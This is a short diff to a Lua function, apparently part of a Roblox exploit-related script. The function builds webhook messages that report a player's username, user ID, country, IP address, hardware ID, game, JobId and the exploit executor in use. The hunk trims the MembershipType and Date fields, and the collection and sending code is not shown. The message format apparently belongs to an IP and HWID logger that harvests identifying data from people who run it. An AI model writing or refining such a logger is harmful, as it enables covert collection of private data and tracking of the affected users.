@@ -56,8 +56,8 @@ local function createWebhookData()
                 },
                 ["description"] = string.format(
                     "__[Player Info](https://www.roblox.com/users/%d)__" ..
-                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
-                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d" ..
+                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nTime:** %s" ..
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                     "\n\n**JobId:**```%s```",
